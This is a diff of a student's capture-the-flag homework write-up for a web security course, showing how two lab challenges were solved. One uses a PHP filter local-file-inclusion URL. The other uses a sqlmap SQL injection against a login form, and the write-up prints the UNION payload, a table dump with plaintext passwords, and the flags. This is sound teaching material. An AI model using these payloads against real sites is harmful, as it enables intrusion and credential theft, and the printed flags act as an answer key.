@@ -4,14 +4,12 @@ HW 3
 
 Profile II
 FLAG: flag{y0u_d1dn7_s4y_th3_m4g1q_w0rd}
-Solution: http://web.n0l3ptr.com:8080/WebII/profile/index.php?page=php://filter/convert.base64-encode/resource=../../flag2
-decode base64
-find value of flag variable
+Solution: I used the PHP filter covered in the lecture slides. The correct LFI URL is http://web.n0l3ptr.com:8080/WebII/profile/index.php?page=php://filter/convert.base64-encode/resource=../../flag2. The flag2.php file was displayed as base64 encoded text in the browser. Once that was decoded the raw PHP code was displayed. The flag was contained in the $flag variable after analyzing the PHP source code.
 
 Superheroes
 FLAG: flag{SQL_1nj3c710n_f0r_7h3_w1n!^$}
-Solution: view page source, get POST parameters
-get target table from html comment
+Solution: I started by looking at the page source. I noted that the POST parameters for the login form were called 'login' and 'password'. The page source also included a HTML comment that contained the 'heroes' table structure which seemed important:
+
 <!-- TODO: Remove SQL to create table from source
 <pre>
 CREATE TABLE heroes (
@@ -23,7 +21,13 @@ icon varchar(512) DEFAULT NULL,
 PRIMARY KEY (id));
 </pre>
 -->
-used python sqlmap.py -u 'http://web.n0l3ptr.com:8080/WebII/sqlchallenge2.php' --data 'login=ironman&password=test' --method POST --level 3 --sql-shell
+
+Once I knew the POST parameters and the SQL table name I used the sqlmap utility with the following parameters:
+
+python sqlmap.py -u 'http://web.n0l3ptr.com:8080/WebII/sqlchallenge2.php' --data 'login=ironman&password=test' --method POST --level 3 --sql-shell
+
+The output from sqlmap showed the following SQL injection vulnerability:
+
 sqlmap identified the following injection point(s) with a total of 957 HTTP(s) requests:
 ---
 Parameter: login (POST)
@@ -35,7 +39,13 @@ Parameter: login (POST)
     Title: Generic UNION query (NULL) - 5 columns
     Payload: login=-8363' UNION ALL SELECT 96,96,96,CONCAT(0x717a767171,0x655252564577746873496b7849707852764c6f77496c4b426e6b597651746c53707453494e477968,0x71627a7a71),96-- yflK&password=test
 ---
-used SELECT * FROM heroes in sql-shell
+
+I used the following SQL query in the sqlmap shell:
+
+SELECT * FROM heroes
+
+This returned the login credentials I was looking for:
+
 SELECT * FROM heroes [7]:
 [*] https://vignette.wikia.nocookie.net/matrix/images/3/32/Neo.jpg/revision/latest/scale-to-width-down/250?cb=20060715235228, 1, Neo, i<3trinity, There is no spoon...
 [*] https://www.lego.com/r/www/r/catalogs/-/media/catalogs/characters/lbm characters/primary/70900_1to1_batman_360_480.png?l.r=1668006940, 2, Batman, I_am_the_n1ght, I Am Batman
@@ -44,3 +54,5 @@ SELECT * FROM heroes [7]:
 [*] https://upload.wikimedia.org/wikipedia/en/5/59/Hulk_(comics_character).png, 5, Hulk, b1gGr33nM0nst3r, Hulk Smash!
 [*] http://somecamerunning.typepad.com/.a/6a00e5523026f58834012876dc02dd970c-800wi, 6, Spiderpig, 01nk01nk01nk, Does whatever spiderpig does...
 [*] https://lumiere-a.akamaihd.net/v1/images/usa_avengers_chi_ironman_n_cf2a66b6.png?region=0,0,300,300, 7, Ironman, t0nyS74rk_b1g_m0n3y$$$, The Flag Is Here!
+
+I used the 'Ironman' account credentials to login and retrieve the flag.
